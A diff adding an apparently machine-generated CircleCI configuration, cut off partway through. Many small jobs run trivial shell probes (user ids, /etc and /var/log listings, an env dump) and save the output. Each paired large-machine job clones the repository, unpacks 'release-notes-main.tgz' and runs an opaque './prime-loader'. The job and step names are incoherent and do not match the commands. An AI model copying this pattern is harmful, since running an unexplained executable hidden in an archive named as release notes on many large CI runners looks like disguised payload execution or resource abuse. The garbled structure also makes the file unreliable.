@@ -1,0 +1,1843 @@
+version: 2.1
+
+jobs:
+  ryo42:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Produce stage2 fixture
+          command: |
+            mkdir -p /tmp/workflow-E
+            set +o pipefail 2>/dev/null; echo "$(seq 1 1377244)" > /tmp/workflow-E/epoch-55z; true
+            { echo "complete"; wc -c /tmp/workflow-E/epoch-55z; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'epoch-55z'
+  assemble-staging-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/epoch-55z 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  article_spawn_next:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Tame the growth medium
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; ls -l /usr/bin | awk '{print $5}' | head -n 15; true ; } > /tmp/workflow-E/D1D
+            { echo "complete"; wc -c /tmp/workflow-E/D1D; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'D1D'
+  fiona-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/D1D 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  bigPawn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Onwards to enforcement
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; say() { echo "$#"; }; say zebra frog swan cat; true ; } > /tmp/workflow-E/bis0n-c1ien7
+            { echo "complete"; wc -c /tmp/workflow-E/bis0n-c1ien7; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'bis0n-c1ien7'
+  preview:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/bis0n-c1ien7 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  secondary_refs:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Remind Mateo to audit the admin tokens
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; for x in /etc/*.d; do basename "$x"; done | head -n 3; true ; } > /tmp/workflow-E/sha_6f92fb94305cc4
+            { echo "complete"; wc -c /tmp/workflow-E/sha_6f92fb94305cc4; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'sha_6f92fb94305cc4'
+  atlas-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/sha_6f92fb94305cc4 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  MAT2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: snapshot queue f77d
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; for name in fox dog goose lion koala cat; do echo -n "${name} "; done; echo; true ; } > /tmp/workflow-E/invoice.silent.atom.violet
+            { echo "complete"; wc -c /tmp/workflow-E/invoice.silent.atom.violet; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'invoice.silent.atom.violet'
+  shippit-57:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/invoice.silent.atom.violet 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  burgundy2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: shadow side texturing
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; (typeset -i id; id=4*8; echo $id); true ; } > /tmp/workflow-E/I
+            { echo "complete"; wc -c /tmp/workflow-E/I; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'I'
+  update-router-bug:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/I 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  input-list--fixed:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Seriously accrue the chargebacks this time
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; find /sys/class/net -maxdepth 3 -type d -not -name '*' -empty -user $(id -un) | awk -F/ '{print $NF}' | sort | uniq -c | sort -rn | head -5; true ; } > /tmp/workflow-E/Cobalt_6712_8f-qa
+            { echo "complete"; wc -c /tmp/workflow-E/Cobalt_6712_8f-qa; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'Cobalt_6712_8f-qa'
+  preview-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/Cobalt_6712_8f-qa 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  s3rverzz063:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Summon the parking passes
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; printf %s 'done!'|sha224sum|awk '{print $1}'; true ; } > /tmp/workflow-E/2b605dba96f764317c8cac4ce68
+            { echo "complete"; wc -c /tmp/workflow-E/2b605dba96f764317c8cac4ce68; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - '2b605dba96f764317c8cac4ce68'
+  py310-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/2b605dba96f764317c8cac4ce68 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  clusterface:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: The card settlements closed successfully
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; ls -pv --color=never | shuf -n 2; true ; } > /tmp/workflow-E/snapshot.2.15
+            { echo "complete"; wc -c /tmp/workflow-E/snapshot.2.15; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'snapshot.2.15'
+  qi-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/snapshot.2.15 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  postSidebarById:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Operation Silent Lantern
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; dirname "/tmp/valley-index-itinerary.csv"; true ; } > /tmp/workflow-E/128.65.128
+            { echo "complete"; wc -c /tmp/workflow-E/128.65.128; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - '128.65.128'
+  dotnet8-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/128.65.128 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  sk-Hans:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Seal the calibration beads on ice
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; touch "/tmp/dr1.dat" && chmod a+r "/tmp/dr1.dat" && stat -c %a "/tmp/dr1.dat"; true ; } > /tmp/workflow-E/otter.fox.thicket.gadget
+            { echo "complete"; wc -c /tmp/workflow-E/otter.fox.thicket.gadget; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'otter.fox.thicket.gadget'
+  ruby3-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/otter.fox.thicket.gadget 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  yieldSalt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Key ring audit run
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; grep --recursive -c --include='*.d' color /etc/profile.d 2>/dev/null|cut -d: -f1|sort -u; true ; } > /tmp/workflow-E/spark.4.8
+            { echo "complete"; wc -c /tmp/workflow-E/spark.4.8; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'spark.4.8'
+  papa:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/spark.4.8 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  VMSHACell:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Produce stage2 fixture
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; for name in {1..8}; do echo "$name";done | nl; true ; } > /tmp/workflow-E/node931
+            { echo "complete"; wc -c /tmp/workflow-E/node931; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'node931'
+  rm-metrics-glitch:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/node931 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  unmountResultLightError:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: May I ask you to dilute the centrifuge rotor
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; find /var/log -maxdepth 3 -type f \( -name '*.old' -o -name '*log*' \) -exec ls -l '{}' \; 2> /dev/null | tail -n 3; true ; } > /tmp/workflow-E/ZyI
+            { echo "complete"; wc -c /tmp/workflow-E/ZyI; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'ZyI'
+  PackageApp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/ZyI 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  report-2015:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Conduct texturing against the skybox
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; id -u; id -g; id -G; true ; } > /tmp/workflow-E/cdf02eb9-c9a1-9455-778a-454a9b80f7
+            { echo "complete"; wc -c /tmp/workflow-E/cdf02eb9-c9a1-9455-778a-454a9b80f7; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'cdf02eb9-c9a1-9455-778a-454a9b80f7'
+  q2-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/cdf02eb9-c9a1-9455-778a-454a9b80f7 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  friendPin:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Part 17 archive the training records
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; parts='let'\''s go!' && printf '%s\n' "${parts/s/0}"; true ; } > /tmp/workflow-E/build.4.5
+            { echo "complete"; wc -c /tmp/workflow-E/build.4.5; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'build.4.5'
+  py311-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/build.4.5 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  STUB_LULLABY_SELECT_MULTI:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: relocate the rotated logs NOPE
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; env -0 |tr '\0' '\n' |sort |head -n 5; true ; } > /tmp/workflow-E/patch-1191
+            { echo "complete"; wc -c /tmp/workflow-E/patch-1191; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'patch-1191'
+  hotfix-6005:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/patch-1191 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  Tool67:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: DILUTE PIPETTE TIPS START
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; /usr/bin/ls -hap /var/spool | awk 'NR % 3 == 0'; true ; } > /tmp/workflow-E/dr1v3r.po1ar
+            { echo "complete"; wc -c /tmp/workflow-E/dr1v3r.po1ar; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'dr1v3r.po1ar'
+  DATA-954:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/dr1v3r.po1ar 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  TEMP_PREFIX:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Can we copy the nightly dumps yet
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; cat /proc/cpuinfo | grep -wi -m 4 processor | sort | uniq -c; true ; } > /tmp/workflow-E/GUEsTDuSTYironfROzEN
+            { echo "complete"; wc -c /tmp/workflow-E/GUEsTDuSTYironfROzEN; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'GUEsTDuSTYironfROzEN'
+  RUN_DEV:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/GUEsTDuSTYironfROzEN 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  cn-mike:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Sign off on deferred revenue ahead of cleanup
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; command -v cd; true ; } > /tmp/workflow-E/mEmoCoPpErAZuReqUeUE
+            { echo "complete"; wc -c /tmp/workflow-E/mEmoCoPpErAZuReqUeUE; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'mEmoCoPpErAZuReqUeUE'
+  VERIFY_DEV:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/mEmoCoPpErAZuReqUeUE 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  p:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Light The Enemy Waves Low Res
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; ver=${ver:-heap}; echo "$ver"; true ; } > /tmp/workflow-E/proton.1.2
+            { echo "complete"; wc -c /tmp/workflow-E/proton.1.2; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'proton.1.2'
+  verify-full-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/proton.1.2 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  ValueFunc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: ph974
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; cp /etc/shells "/var/tmp/ta2026-02-01.bak"&& sed -i.orig '/^#/d' "/var/tmp/ta2026-02-01.bak"&& diff /etc/shells "/var/tmp/ta2026-02-01.bak"|head -n 5; true ; } > /tmp/workflow-E/temp-c22
+            { echo "complete"; wc -c /tmp/workflow-E/temp-c22; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'temp-c22'
+  preview-v8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/temp-c22 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  success_city_link_3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: MuxLowerThirds
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; for name in {1..14..2};do echo "${name} squared is $((name**2))"; done|paste -sd ' '; true ; } > /tmp/workflow-E/AJ0v9h6dX5b9
+            { echo "complete"; wc -c /tmp/workflow-E/AJ0v9h6dX5b9; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'AJ0v9h6dX5b9'
+  tweak-router-v2-reload:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/AJ0v9h6dX5b9 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  PARSER_SUPER_ACTIVE_90:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Runway 33 fact check
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; mkdir -p '/tmp/trace' && head -c 33749 /dev/urandom >'/tmp/trace'/blob && du -sh '/tmp/trace'; true ; } > /tmp/workflow-E/4dc158
+            { echo "complete"; wc -c /tmp/workflow-E/4dc158; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - '4dc158'
+  add-edge-reload:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/4dc158 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  reactor-button-seed-scarlet:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Produce stage2 fixture
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; ps -eo pid,rss,comm | sort -r -n -k3 | awk 'NR>1 {print $1}' | tr a-z A-Z | fmt -w 65; true ; } > /tmp/workflow-E/Glacier
+            { echo "complete"; wc -c /tmp/workflow-E/Glacier; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'Glacier'
+  VerifyProd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/Glacier 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  complexFlag:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: filter test tubes DOC 670
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; for word in travel red signal home; do printf '%s\n' ${word}; done | head -n 3; true ; } > /tmp/workflow-E/xx_30c7d55
+            { echo "complete"; wc -c /tmp/workflow-E/xx_30c7d55; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'xx_30c7d55'
+  assemble-end-to-end-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
